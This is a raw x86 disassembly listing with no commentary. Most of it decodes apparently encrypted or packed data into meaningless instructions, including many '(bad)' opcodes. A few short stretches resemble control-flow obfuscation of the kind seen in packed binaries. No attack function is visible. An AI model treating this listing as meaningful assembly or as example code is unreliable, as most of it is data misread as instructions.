  40a9cc:	sbb    BYTE PTR [edi-0x56],bh
  40a9cf:	sti    
  40a9d0:	xchg   ebp,eax
  40a9d1:	push   cs
  40a9d2:	fisttp QWORD PTR [esi+0x1a]
  40a9d5:	and    edx,DWORD PTR [edi+edi*1+0x78]
  40a9d9:	scas   eax,DWORD PTR es:[edi]
  40a9da:	sbb    BYTE PTR [edx],bh
  40a9dc:	stos   BYTE PTR es:[edi],al
  40a9dd:	mov    esp,0x6e9ef44c
  40a9e2:	sub    DWORD PTR [ebp+0x712fe042],edi
  40a9e8:	pop    ebx
  40a9e9:	xlat   BYTE PTR ds:[ebx]
  40a9ea:	lock test DWORD PTR [esi+0x492c6e0],0x3a3464b8
  40a9f5:	xor    DWORD PTR [edx-0x65],edx
  40a9f8:	call   0xcf729056
  40a9fd:	sub    eax,0xa8e06dd7
  40aa02:	cdq    
  40aa03:	imul   esp,DWORD PTR [ebx],0x21f0586c
  40aa09:	jge    0x40a9ba
  40aa0b:	jge    0x40a99f
  40aa0d:	lock jg 0x40aa01
  40aa10:	iret   
  40aa11:	stos   DWORD PTR es:[edi],eax
  40aa12:	fdiv   QWORD PTR [edx+0xe5a3f0c]
  40aa18:	call   0x30dd:0x300a5ffb
  40aa1f:	jecxz  0x40aa91
  40aa21:	shr    ch,1
  40aa23:	add    esp,0x2007a314
  40aa29:	(bad)  
  40aa2a:	icebp  
  40aa2b:	fisub  DWORD PTR [edi+0x42cb0212]
  40aa31:	leave  
  40aa32:	push   cs
  40aa33:	jecxz  0x40aa1a
  40aa35:	clc    
  40aa36:	pop    ds
  40aa37:	xchg   esi,eax
  40aa38:	call   0x7e72ca5e
  40aa3d:	xor    ebp,0xa9738cfa
  40aa43:	je     0x40aa69
  40aa45:	sahf   
  40aa46:	sbb    eax,0xe00769d9
  40aa4b:	and    BYTE PTR [edi],dl
  40aa4d:	sbb    eax,0x80f4c56f
  40aa52:	scas   al,BYTE PTR es:[edi]
  40aa53:	mov    al,0x66
  40aa55:	pop    eax
  40aa56:	xchg   edx,eax
  40aa57:	cwde   
  40aa58:	adc    eax,0xc72bba46
  40aa5d:	sbb    edi,DWORD PTR [edi]
  40aa5f:	cmp    BYTE PTR [edi],dh
  40aa61:	cld    
  40aa62:	test   DWORD PTR [edx+0x2027c9f5],edi
  40aa68:	sub    al,0x5f
  40aa6a:	adc    al,0xfd
  40aa6c:	aas    
  40aa6d:	into   
  40aa6e:	xchg   esi,eax
  40aa6f:	dec    ecx
  40aa70:	test   BYTE PTR [ebx],dh
  40aa72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa73:	pop    ecx
  40aa74:	xor    al,0xaa
  40aa76:	dec    esi
  40aa77:	ins    DWORD PTR es:[edi],dx
  40aa78:	adc    al,0x9
  40aa7a:	fcomp  DWORD PTR [ecx+0x34]
  40aa7d:	xor    al,0x9
  40aa7f:	xchg   BYTE PTR [ebp-0x41],dl
  40aa82:	cmp    eax,0xd6f78880
  40aa87:	inc    esi
  40aa88:	sub    ecx,ebp
  40aa8a:	scas   al,BYTE PTR es:[edi]
  40aa8b:	sar    edi,0x8d
  40aa8e:	icebp  
  40aa8f:	test   eax,0x92f498ff
  40aa94:	fisub  DWORD PTR [ecx-0x7e02d45c]
  40aa9a:	inc    ecx
  40aa9b:	pop    edx
  40aa9c:	(bad)  
  40aa9d:	xchg   ecx,eax
  40aa9e:	or     DWORD PTR [edi-0x5],ecx
  40aaa1:	mov    ds:0x96fc29c3,al
  40aaa6:	scas   al,BYTE PTR es:[edi]
  40aaa7:	call   0xecb9cb3d
  40aaac:	pop    es
  40aaad:	mov    ebp,0x836f5e6
  40aab2:	fisubr DWORD PTR [edi]
  40aab4:	int    0x61
  40aab6:	sub    eax,0xab990683
  40aabb:	addr16 mov ecx,esi
  40aabe:	pop    es
  40aabf:	or     ebp,DWORD PTR [ecx+eiz*1]
  40aac2:	imul   edi,DWORD PTR [ebx-0x3c],0xb3e0830a
  40aac9:	pop    edi
  40aaca:	leave  
  40aacb:	lahf   
  40aacc:	dec    esp
  40aacd:	out    dx,al
  40aace:	shl    DWORD PTR [ebx+ebx*8],1
  40aad1:	xchg   esp,eax
  40aad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aad3:	(bad)  
  40aad4:	push   edx
  40aad5:	call   0x697d:0x6d0550bc
  40aadc:	sbb    ecx,DWORD PTR [ecx]
  40aade:	xor    ah,0xd
  40aae1:	jp     0x40aa66
  40aae3:	jl     0x40aa6e
  40aae5:	loopne 0x40aaa2
  40aae7:	lds    ecx,FWORD PTR [esi-0x16]
  40aaea:	mov    al,ds:0x50347550
  40aaef:	pop    ss
  40aaf0:	pop    ecx
  40aaf1:	imul   eax,DWORD PTR [eax+0x63],0x4995e35a
  40aaf8:	sub    DWORD PTR [ecx-0x56],0xfffffffa
  40aafc:	ficomp DWORD PTR [ecx+esi*8-0x1b9f4d42]
  40ab03:	pop    edx
  40ab04:	lods   eax,DWORD PTR ds:[esi]
  40ab05:	pop    edx
  40ab06:	popf   
  40ab07:	test   edi,edi
  40ab09:	nop
  40ab0a:	fcomp  st(0)
  40ab0c:	mov    ebp,0xe85372e9
  40ab11:	and    esp,DWORD PTR [ebx+0x16]
  40ab14:	mov    ch,0x9
  40ab16:	inc    esp
  40ab17:	aaa    
  40ab18:	jae    0x40ab34
  40ab1a:	or     esp,ebp
  40ab1c:	dec    edx
  40ab1d:	jg     0x40aabf
  40ab1f:	js     0x40ab91
  40ab21:	and    bh,dl
  40ab23:	aas    
  40ab24:	loope  0x40aacd
  40ab26:	int    0x8b
  40ab28:	jecxz  0x40ab9f
  40ab2a:	rol    DWORD PTR [ebx+0xb886002],1
  40ab30:	xchg   ebx,eax
  40ab31:	(bad)  
  40ab32:	add    cl,BYTE PTR [eax-0x48b46ce8]
  40ab38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab39:	pop    esi
  40ab3a:	push   ecx
  40ab3b:	bound  ecx,QWORD PTR [esi+0x28fe8385]
  40ab41:	int    0x91
  40ab43:	shl    BYTE PTR [edx+0x77],0x88
  40ab47:	xor    al,0x2b
  40ab49:	loopne 0x40ab24
  40ab4b:	cld    
  40ab4c:	aam    0x61
  40ab4e:	call   0x8255bd00
  40ab53:	mov    cl,0xe9
  40ab55:	jno    0x40ab77
  40ab57:	xchg   edi,eax
  40ab58:	imul   ecx,DWORD PTR [eax+edi*8],0xfffffffc
  40ab5c:	pop    esi
  40ab5d:	sub    eax,0x59515bd6
  40ab62:	adc    eax,0xfbc3ec08
  40ab67:	push   ecx
  40ab68:	pop    edi
  40ab69:	push   0xf9e9b677
  40ab6e:	inc    eax
  40ab6f:	sub    al,0x47
  40ab71:	mov    edi,0x82d563a2
  40ab76:	dec    esp
  40ab77:	mov    edx,DWORD PTR [edx]
  40ab79:	das    
  40ab7a:	icebp  
  40ab7b:	mov    ds:0x41b224aa,al
  40ab80:	jmp    0xcb679e2d
  40ab85:	int    0x35
  40ab87:	and    ch,al
  40ab89:	inc    edi
  40ab8a:	iret   
  40ab8b:	test   BYTE PTR [ecx],0xda
  40ab8e:	test   ebx,edx
  40ab90:	jb     0x40ab86
  40ab92:	mov    esi,0xfe047242
  40ab97:	pop    esp
  40ab98:	dec    esi
  40ab99:	cs pop ss
  40ab9b:	lock stc 
  40ab9d:	pop    ebx
  40ab9e:	mov    ecx,0xaef263ec
  40aba3:	dec    esi
  40aba4:	retf   0x96ca
  40aba7:	leave  
  40aba8:	mov    edx,0xa8c99b0f
  40abad:	shl    DWORD PTR ds:0x4fd96330,cl
  40abb3:	retf   0x9310
  40abb6:	fisub  DWORD PTR [ecx]
  40abb8:	xor    DWORD PTR [ebx-0x7893637],ebx
  40abbe:	iret   
  40abbf:	add    eax,0x6309f621
  40abc4:	mov    ah,0x34
  40abc6:	pop    esi
  40abc7:	jbe    0x40ab97
  40abc9:	(bad)  
  40abca:	sti    
  40abcb:	addr16 ds push cs
  40abce:	push   ecx
  40abcf:	test   al,0x7
  40abd1:	add    BYTE PTR [edx+0x69],cl
  40abd4:	mov    ds:0x5fdedab9,eax
  40abd9:	xchg   esp,eax
  40abda:	mov    esp,0xe9c7624
  40abdf:	xor    ebx,DWORD PTR [esi+0x76]
  40abe2:	and    DWORD PTR [ecx+0x63],esi
  40abe5:	shl    ebp,cl
  40abe7:	bound  ebx,QWORD PTR [ebp+0xa]
  40abea:	aad    0x69
  40abec:	loope  0x40abbb
  40abee:	xchg   ebx,eax
  40abef:	imul   esp,DWORD PTR [esi+0x3a],0xa66aea7e
  40abf6:	xchg   DWORD PTR [ebx+0x54],eax
  40abf9:	aaa    
  40abfa:	push   edx
  40abfb:	cmc    
  40abfc:	push   esi
  40abfd:	not    edx
  40abff:	sar    ebp,1
  40ac01:	loope  0x40ac00
  40ac03:	add    bl,BYTE PTR [eax]
  40ac05:	fld    DWORD PTR [esi+eax*2+0x3126a472]
  40ac0c:	sub    ebx,edi
  40ac0e:	ret    0x1b13
  40ac11:	jo     0x40abd2
  40ac13:	nop
  40ac14:	out    0x87,eax
  40ac16:	mov    ds:0x83b2575d,al
  40ac1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac1c:	pop    ebx
  40ac1d:	in     al,dx
  40ac1e:	mov    esi,0x20df83a1
  40ac23:	and    DWORD PTR [ecx-0x5f],edx
  40ac26:	retf   
  40ac27:	add    edx,DWORD PTR ds:0xf903edb0
  40ac2d:	mov    al,0x74
  40ac2f:	pop    ds
  40ac30:	and    al,0x14
  40ac32:	xchg   edx,ebx
  40ac34:	loope  0x40ac32
  40ac36:	inc    esp
  40ac37:	mov    eax,ds:0xa0073bd8
  40ac3c:	sar    BYTE PTR [eax-0x7],cl
  40ac3f:	int    0x39
  40ac41:	xchg   ecx,eax
  40ac42:	add    eax,0x521852dc
  40ac47:	cmp    eax,0xe6cec71a
  40ac4c:	retf   0x817f
  40ac4f:	xor    ebx,ecx
  40ac51:	xor    edx,edx
  40ac53:	add    eax,esi
  40ac55:	add    ebx,esi
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	getsec 
  40ac8d:	add    eax,0x80d62b1b
  40ac92:	js     0x40ad0c
  40ac94:	je     0x40ad14
  40ac96:	js     0x40ad10
  40ac98:	enter  0x3d56,0xc4
  40ac9c:	repnz mov dl,0x43
  40ac9f:	cli    
  40aca0:	cmp    eax,0x4fdfcde1
  40aca5:	cmp    al,0x9d
  40aca7:	and    esi,DWORD PTR [esi+0x30]
  40acaa:	pop    ds
  40acab:	xchg   ebx,eax
  40acac:	jns    0x40ac93
  40acae:	push   edi
  40acaf:	lods   al,BYTE PTR ds:[esi]
  40acb0:	cld    
  40acb1:	pop    edx
  40acb2:	pop    edi
  40acb3:	neg    ah
  40acb5:	or     ebp,eax
  40acb7:	mov    esi,0xe235a196
  40acbc:	lock mov eax,0x7b99a1fa
  40acc2:	push   esi
  40acc3:	retf   
  40acc4:	imul   ebp,DWORD PTR [ecx],0x44b7015f
  40acca:	dec    esp
  40accb:	inc    edx
  40accc:	in     al,dx
  40accd:	cmp    al,0xc7
  40accf:	shr    edx,1
  40acd1:	mov    esp,0x30f1ba05
  40acd6:	daa    
  40acd7:	mov    bh,0xe4
  40acd9:	(bad)  
  40acda:	call   0x67b313c0
  40acdf:	lds    esp,FWORD PTR [ebx]
  40ace1:	pop    esi
  40ace2:	arpl   WORD PTR ds:0x91892a1d,cx
  40ace8:	mov    ecx,0x600b2d1d
  40aced:	mov    ds:0x1fcf56cc,eax
  40acf2:	sti    
  40acf3:	ins    DWORD PTR es:[edi],dx
  40acf4:	mov    BYTE PTR [ecx+0x37298b3f],ch
  40acfa:	jno    0x40ac90
  40acfc:	mov    dl,0x20
  40acfe:	icebp  
  40acff:	or     cl,cl
  40ad01:	(bad)  
  40ad02:	mov    eax,ds:0x55073574
  40ad07:	mov    ah,0x49
  40ad09:	ss mov ss:0xbfac085a,al
  40ad10:	ins    BYTE PTR es:[edi],dx
  40ad11:	mov    bh,0x49
  40ad13:	pop    ecx
  40ad14:	adc    DWORD PTR [eax+0x5b],ebx
  40ad17:	popf   
  40ad18:	xor    BYTE PTR [edx],cl
  40ad1a:	mov    ah,bl
  40ad1c:	jae    0x40accc
  40ad1e:	jbe    0x40ad16
  40ad20:	jo     0x40ad77
  40ad22:	test   BYTE PTR [ecx],bl
  40ad24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad25:	xchg   esi,eax
  40ad26:	stos   DWORD PTR es:[edi],eax
  40ad27:	lock cmc 
  40ad29:	into   
  40ad2a:	test   DWORD PTR [edx-0x49],edx
  40ad2d:	repz in eax,dx
  40ad2f:	and    dh,BYTE PTR [ecx-0x188eb88b]
  40ad35:	jno    0x40ad73
  40ad37:	das    
  40ad38:	test   BYTE PTR [esi+0x70c0c4e9],0x9b
  40ad3f:	sub    al,0x3
  40ad41:	(bad)  
  40ad42:	xor    eax,0x19889f6c
  40ad47:	mov    cl,0xb9
  40ad49:	cmp    dl,BYTE PTR [ecx+0x67]
  40ad4c:	lahf   
  40ad4d:	inc    edx
  40ad4e:	dec    eax
  40ad4f:	sub    edx,ebp
  40ad51:	aaa    
  40ad52:	ror    al,cl
  40ad54:	inc    esi
  40ad55:	push   ss
  40ad56:	sub    DWORD PTR [esi+ebp*8],eax
  40ad59:	fsub   QWORD PTR [esi+0x38]
  40ad5c:	inc    edx
  40ad5d:	stos   DWORD PTR es:[edi],eax
  40ad5e:	add    al,0x65
  40ad60:	in     al,0xe6
  40ad62:	out    dx,eax
  40ad63:	push   cs
  40ad64:	test   esp,ebx
  40ad66:	mov    ebx,0x5bc311d5
  40ad6b:	ret    0x31fd
  40ad6e:	arpl   si,bp
  40ad70:	adc    eax,0xb4ca3ab7
  40ad75:	add    ebp,edx
  40ad77:	std    
  40ad78:	in     eax,dx
  40ad79:	(bad)  
  40ad7a:	sbb    al,0xe8
  40ad7c:	test   eax,0x7cfc6675
  40ad81:	div    BYTE PTR [ecx-0x3d]
  40ad84:	sub    BYTE PTR [edi+0x3ec2182d],ah
  40ad8a:	pop    edi
  40ad8b:	or     eax,0x264d288c
  40ad90:	jns    0x40ae08
  40ad92:	out    dx,eax
  40ad93:	xor    al,bl
  40ad95:	rol    ah,1
  40ad97:	pop    es
  40ad98:	arpl   WORD PTR [ecx+ebx*4+0x60c9892a],cx
  40ad9f:	add    DWORD PTR [ebx-0x46],esp
  40ada2:	adc    DWORD PTR [ebp+0x1],edx
  40ada5:	mov    edx,0x1c57a96c
  40adaa:	dec    eax
  40adab:	sub    al,0x8b
  40adad:	xchg   DWORD PTR [eax],ebp
  40adaf:	jnp    0x40ad85
  40adb1:	mov    dl,0x32
  40adb3:	xchg   bh,ch
  40adb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adb6:	adc    eax,0x7ab8711d
  40adbb:	jp     0x40ad9c
  40adbd:	cmc    
  40adbe:	es push ss
  40adc0:	cmp    dl,BYTE PTR [edi+0x61]
  40adc3:	(bad)  
  40adc5:	xlat   BYTE PTR ds:[ebx]
  40adc6:	pop    ebx
  40adc7:	fidivr WORD PTR [edx-0x36c7fb8f]
  40adcd:	mov    WORD PTR [edi+edx*1-0x44],ss
  40add1:	inc    ecx
  40add2:	out    0xb,eax
  40add4:	leave  
  40add5:	push   esp
  40add6:	mov    dl,0x8a
  40add8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40add9:	cmp    al,BYTE PTR [edx]
  40addb:	sbb    ebx,DWORD PTR ds:[eax+0x4e]
  40addf:	test   eax,0xf06f3ed5
  40ade4:	jge    0x40ae16
  40ade6:	fs sub eax,0x36717430
  40adec:	or     eax,0xfd19530c
  40adf1:	jb     0x40adbc
  40adf3:	test   DWORD PTR [ebx],eax
  40adf5:	cmp    ebx,esp
  40adf7:	pop    edi
  40adf8:	inc    esi
  40adf9:	jnp    0x40adf3
  40adfb:	mov    es,WORD PTR [ecx]
  40adfd:	adc    al,0x5a
  40adff:	into   
  40ae00:	fnstsw WORD PTR [eax+ebp*8-0x89f1e7e]
  40ae07:	aas    
  40ae08:	outs   dx,DWORD PTR ds:[esi]
  40ae09:	xchg   edx,eax
  40ae0a:	push   ebx
  40ae0b:	xchg   ecx,eax
  40ae0c:	inc    ecx
  40ae0d:	ss pop es
  40ae0f:	sub    al,0x11
  40ae11:	sub    BYTE PTR [ecx-0x1b],0x7b
  40ae15:	inc    esp
  40ae16:	xchg   esp,eax
  40ae17:	jne    0x40ae3a
  40ae19:	xchg   edx,eax
  40ae1a:	dec    ebp
  40ae1b:	sbb    DWORD PTR [esi],ebx
  40ae1d:	ins    DWORD PTR es:[edi],dx
  40ae1e:	scas   eax,DWORD PTR es:[edi]
  40ae1f:	xor    ebp,0xffffffee
  40ae22:	scas   eax,DWORD PTR es:[edi]
  40ae23:	(bad)  
  40ae24:	(bad)  
  40ae25:	jb     0x40adec
  40ae27:	in     al,0x50
  40ae29:	xor    eax,0x32e54f9
  40ae2e:	imul   ebx,DWORD PTR [ecx-0x7c],0xffffffb3
  40ae32:	pop    esp
  40ae33:	bound  ebp,QWORD PTR [edi+0x30]
  40ae36:	mov    eax,ds:0xa8938db5
  40ae3b:	cmp    DWORD PTR fs:[edx+ebx*1-0x62],ebp
  40ae40:	popf   
  40ae41:	cld    
  40ae42:	lea    eax,[esi]
  40ae44:	inc    ebp
  40ae45:	ficom  DWORD PTR [ecx+0x32]
  40ae48:	in     eax,dx
  40ae49:	add    BYTE PTR [ecx+0x1a],bh
  40ae4c:	cmp    eax,0xf182bc61
  40ae51:	adc    al,0x6e
  40ae53:	call   FWORD PTR [ebp-0x58]
  40ae56:	sub    DWORD PTR [edi],edi
  40ae58:	mov    edi,0xc9456de8
  40ae5d:	push   ss
  40ae5e:	inc    eax
  40ae5f:	ds pop ebp
  40ae61:	inc    ebp
  40ae62:	and    al,0xd
  40ae64:	mov    al,ds:0x32c31e36
  40ae69:	mov    ebx,0xd96628dd
  40ae6e:	inc    ecx
  40ae6f:	int    0x26
  40ae71:	pusha  
  40ae72:	push   eax
  40ae73:	popf   
  40ae74:	(bad)  
  40ae75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae76:	pusha  
  40ae77:	arpl   WORD PTR [edx+0x43],dx
  40ae7a:	sbb    esi,DWORD PTR [esi+0x63c55da1]
  40ae80:	cs aas 
  40ae82:	pop    eax
  40ae83:	mov    edi,0x7e032234
  40ae88:	adc    eax,0x97922232
  40ae8d:	call   0xbc20:0xd7c67973
  40ae94:	mov    bh,BYTE PTR ds:0x3da9f15a
  40ae9a:	cmp    bh,BYTE PTR [eax-0x1b]
  40ae9d:	cs and edx,ebp
  40aea0:	mov    eax,ds:0x4d418a2
  40aea5:	mov    eax,DWORD PTR [ecx+0x48]
  40aea8:	cs push ebp
  40aeaa:	inc    ebp
  40aeab:	jne    0x40af00
  40aead:	std    
  40aeae:	xchg   ebx,eax
  40aeaf:	add    DWORD PTR [edx+esi*8-0x20078d94],ecx
  40aeb6:	scas   eax,DWORD PTR es:[edi]
  40aeb7:	xchg   edx,eax
  40aeb8:	call   0xfbaf0d04
  40aebd:	outs   dx,BYTE PTR ds:[esi]
  40aebe:	cwde   
  40aebf:	pop    es
  40aec0:	mov    edx,ebx
  40aec2:	xor    DWORD PTR [edx],eax
  40aec4:	and    DWORD PTR [ebx-0x4c509704],esi
  40aeca:	push   eax
  40aecb:	jne    0x40aea6
  40aecd:	cld    
  40aece:	stos   DWORD PTR es:[edi],eax
  40aecf:	fcmovnb st,st(1)
  40aed1:	sub    DWORD PTR [ebx+0x7],eax
  40aed4:	pop    esi
  40aed5:	fnstsw WORD PTR [esi-0x16c8266f]
  40aedb:	dec    edx
  40aedc:	fwait
  40aedd:	mov    cl,0xd6
  40aedf:	xor    DWORD PTR [esi+0x5b874c39],esp
  40aee5:	fwait
  40aee6:	pop    es
  40aee7:	adc    al,0x92
  40aee9:	inc    edx
  40aeea:	aaa    
  40aeeb:	retf   0x1c72
  40aeee:	push   eax
  40aeef:	xchg   ebx,eax
  40aef0:	mov    al,0x66
  40aef2:	sbb    DWORD PTR [eax-0x42b8a0c],esi
  40aef8:	(bad)  
  40aef9:	test   ebx,0x4f4eaa40
  40aeff:	(bad)  
  40af00:	adc    bl,BYTE PTR [ecx-0x383b021b]
  40af06:	or     esp,DWORD PTR [edx-0x12de2dc7]
  40af0c:	popf   
  40af0d:	jmp    DWORD PTR [eax]
  40af0f:	pop    ds
  40af10:	mov    ds:0x7ee93e8c,al
  40af15:	push   esi
  40af16:	push   es
  40af17:	in     al,dx
  40af18:	je     0x40af2b
  40af1a:	int3   
  40af1b:	(bad)  
  40af1d:	adc    DWORD PTR [edi-0x6d321a1],ecx
  40af23:	sbb    al,0x2c
  40af25:	mov    al,ds:0x693c3d98
  40af2a:	std    
  40af2b:	inc    ecx
  40af2c:	pusha  
  40af2d:	pop    es
  40af2e:	push   0x0
  40af30:	stos   DWORD PTR es:[edi],eax
  40af31:	ss cs inc ebp
  40af34:	out    dx,al
  40af35:	pop    ebx
  40af36:	icebp  
  40af37:	(bad)  
  40af38:	xchg   DWORD PTR [ebp+edi*1+0x59f7ecde],ecx
  40af3f:	loope  0x40afaf
  40af41:	int    0xe6
  40af43:	sbb    DWORD PTR [edx],0x61
  40af46:	ss out dx,eax
  40af48:	in     eax,0xc1
  40af4a:	mov    dl,0x6a
  40af4c:	test   dl,al
  40af4e:	xchg   esp,eax
  40af4f:	hlt    
  40af50:	mov    ebx,0x6c8f5b04
  40af55:	jnp    0x40af9f
  40af57:	cwde   
  40af58:	and    BYTE PTR [ecx-0x6],ah
  40af5b:	mov    ecx,es
  40af5d:	repz push edx
  40af5f:	outs   dx,DWORD PTR ds:[esi]
  40af60:	dec    eax
  40af61:	sub    esp,DWORD PTR [ebp+0x51]
  40af64:	sub    esi,esi
  40af66:	test   cl,0x7a
  40af69:	(bad)  
  40af6a:	aaa    
  40af6b:	mov    cl,BYTE PTR [ebp+0x7f]
  40af6e:	cld    
  40af6f:	xor    BYTE PTR [eax+0x2a537903],bh
  40af75:	in     al,0xb8
  40af77:	jne    0x40af7d
  40af79:	bound  ecx,QWORD PTR [ebx-0x28]
  40af7c:	test   eax,0xcf192373
  40af81:	enter  0x580,0x1a
  40af85:	pushf  
  40af86:	mov    dh,al
  40af88:	scas   eax,DWORD PTR es:[edi]
  40af89:	cmp    esi,edx
  40af8b:	push   esp
  40af8c:	or     eax,DWORD PTR ds:[esi+0x24506651]
  40af93:	push   ds
  40af94:	mov    edx,DWORD PTR [eax]
  40af96:	imul   edx,edx,0xf89ea9ed
  40af9c:	mov    DWORD PTR [eax],edx
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	push   ebp
  40afb3:	pop    ebp
  40afb4:	vpmacssww xmm7,xmm5,xmm7,XMMWORD PTR [eax+0x78]
  40afbb:	jle    0x40b035
  40afbd:	js     0x40b037
  40afbf:	dec    ebx
  40afc0:	aas    
  40afc1:	int    0xf9
  40afc3:	jnp    0x40b01b
  40afc5:	out    0x39,eax
  40afc7:	mov    BYTE PTR [ebp-0x47],dl
  40afca:	push   cs
  40afcb:	mov    bl,BYTE PTR [edx-0x1e0e66f9]
  40afd1:	sahf   
  40afd2:	xor    DWORD PTR [ecx],esp
  40afd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afd5:	jae    0x40afb9
  40afd7:	int    0xee
  40afd9:	cmp    al,0x7e
  40afdb:	jno    0x40af68
  40afdd:	xchg   esp,eax
  40afde:	lock sub BYTE PTR [eax+0x3a],dl
  40afe2:	outs   dx,DWORD PTR ds:[esi]
  40afe3:	xchg   edx,eax
  40afe4:	push   edx
  40afe5:	arpl   WORD PTR [ebp-0x7a445008],cx
  40afeb:	jl     0x40afb9
  40afed:	inc    ebp
  40afee:	sub    ax,0xf4f3
  40aff2:	push   ecx
  40aff3:	ins    BYTE PTR es:[edi],dx
  40aff4:	das    
  40aff5:	xor    DWORD PTR [edi+0x4a],0x53
  40aff9:	jmp    0x40b017
  40affb:	jb     0x40b02a
  40affd:	xor    DWORD PTR [edx],0xb8002db2
  40b003:	sub    al,0x54
  40b005:	jae    0x40aff4
  40b007:	push   0x9ae3d37d
  40b00c:	cmp    al,BYTE PTR [ebp+0x596a35e9]
  40b012:	jo     0x40b039
  40b014:	fcomp  DWORD PTR [esi+0x1a]
  40b017:	shl    BYTE PTR [ebx],0x9d
  40b01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b01b:	jmp    0x40afcd
  40b01d:	mov    al,ds:0xede68600
  40b022:	and    DWORD PTR [ecx],esi
  40b024:	int3   
  40b025:	jbe    0x40b072
  40b027:	adc    cl,bh
  40b029:	xor    ecx,edx
  40b02b:	int    0xc6
  40b02d:	mov    ebx,0x1d5e999f
  40b032:	mov    edx,0xe603d800
  40b037:	xor    DWORD PTR [ecx-0x4d],edi
  40b03a:	bound  esp,QWORD PTR [edi]
  40b03c:	stos   DWORD PTR es:[edi],eax
  40b03d:	lds    esp,FWORD PTR [edx]
  40b03f:	push   ecx
  40b040:	shl    ebx,0xd8
  40b043:	sti    
  40b044:	les    eax,FWORD PTR [edx+0x65db7840]
  40b04a:	(bad)  
  40b04b:	icebp  
  40b04c:	stos   DWORD PTR es:[edi],eax
  40b04d:	cwde   
  40b04e:	sub    eax,0xb296776a
  40b053:	jg     0x40b063
  40b055:	jbe    0x40b031
  40b057:	pop    eax
  40b058:	sbb    DWORD PTR [ebx],esp
  40b05a:	push   eax
  40b05b:	jne    0x40b05f
  40b05d:	addr16 adc al,dh
  40b060:	bound  esp,QWORD PTR [esp+edi*8]
  40b063:	lahf   
  40b064:	lea    eax,[ebx]
  40b066:	cmp    DWORD PTR [ecx-0x13],ebx
  40b069:	inc    eax
  40b06a:	dec    edi
  40b06b:	lods   eax,DWORD PTR ds:[esi]
  40b06c:	pop    edi
  40b06d:	push   eax
  40b06e:	in     eax,0x6
  40b070:	jmp    0x40b0f0
  40b072:	xchg   edx,eax
  40b073:	push   0x21
  40b075:	pop    es
  40b076:	xchg   esi,eax
  40b077:	inc    DWORD PTR [eax+eax*1+0x4ed776d5]
  40b07e:	lods   eax,DWORD PTR ds:[esi]
  40b07f:	mov    esi,0x3d423598
  40b084:	shl    DWORD PTR [esi+esi*2],1
  40b087:	aaa    
  40b088:	cmc    
  40b089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b08a:	fild   DWORD PTR [edx]
  40b08c:	mov    dl,0x93
  40b08e:	xchg   ecx,eax
  40b08f:	fxch   st(5)
  40b091:	jo     0x40b089
  40b093:	push   ebp
  40b094:	dec    ebx
  40b095:	pop    esp
  40b096:	outs   dx,BYTE PTR ds:[esi]
  40b097:	inc    edi
  40b098:	repnz xor DWORD PTR [ebx-0x48],edi
  40b09c:	push   DWORD PTR [ecx-0x6e]
  40b09f:	mov    esp,DWORD PTR [edi-0x53]
  40b0a2:	int3   
  40b0a3:	dec    eax
  40b0a4:	mov    eax,0x5a89188d
  40b0a9:	jmp    0x40b0c8
  40b0ab:	cdq    
  40b0ac:	jae    0x40b0bc
  40b0ae:	push   ecx
  40b0af:	lds    eax,FWORD PTR [ebx-0xab24392]
  40b0b5:	imul   edx,DWORD PTR cs:[ebp+0x7d],0xffffffd7
  40b0ba:	jno    0x40b0da
  40b0bc:	cmp    DWORD PTR [edx+0x45],0x8b37e295
  40b0c3:	iret   
  40b0c4:	mov    ecx,0x1a31a743
  40b0c9:	sbb    ebx,DWORD PTR [edx]
  40b0cb:	jb     0x40b0f1
  40b0cd:	and    eax,0x632fc86c
  40b0d2:	pusha  
  40b0d3:	ins    DWORD PTR es:[edi],dx
  40b0d4:	dec    esi
  40b0d5:	or     al,0xf4
  40b0d7:	sub    DWORD PTR [ebp-0x3177d1b2],0xbdaa8eb7
  40b0e1:	(bad)  
  40b0e3:	sbb    bl,0x59
  40b0e6:	out    dx,al
  40b0e7:	fwait
  40b0e8:	inc    ebp
  40b0e9:	sub    BYTE PTR [ebp-0x692a10e3],cl
  40b0ef:	adc    ebx,eax
  40b0f1:	dec    ebx
  40b0f2:	add    eax,0xaf1f017
  40b0f7:	daa    
  40b0f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0f9:	das    
  40b0fa:	mov    bl,0xa9
  40b0fc:	dec    ebp
  40b0fd:	sub    al,0x85
  40b0ff:	or     eax,0xa462d63e
  40b104:	pop    ebx
  40b105:	jl     0x40b0f2
  40b107:	fcmovnu st,st(2)
  40b109:	add    cl,BYTE PTR [esi-0x199cd065]
  40b10f:	int3   
  40b110:	and    BYTE PTR [ecx-0x12964f86],al
  40b116:	adc    al,0x4c
